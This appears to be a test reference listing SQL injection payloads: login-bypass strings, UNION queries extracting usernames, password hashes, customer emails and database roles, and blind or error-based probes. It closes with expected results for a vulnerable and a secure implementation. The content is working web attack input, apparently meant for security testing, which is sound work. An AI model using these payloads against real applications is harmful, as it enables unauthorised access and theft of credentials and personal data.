# SQL Injection Test Payloads Reference

## 1. Authentication Bypass Payloads
```sql
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
admin' --
' OR 1=1 LIMIT 1 --
```

## 2. Union-Based Information Disclosure Payloads
```sql
' UNION SELECT null, username, password_hash, role FROM app_users --
' UNION SELECT null, full_name, email, status FROM customers --
' UNION SELECT null, rolname, null, null FROM pg_roles --
```

## 3. Error-Provoking & Boolean Blind Payloads
```sql
' AND 1=CAST((SELECT version()) AS int) --
' AND (SELECT count(*) FROM app_users) > 0 --
```

## 4. Expected Outcomes
- **Variant A (Vulnerable):** SQL syntax modified; authentication bypassed or syntax error disclosed.
- **Variant B (Secure):** Bound as a literal value; no query syntax modification; 0 rows returned.

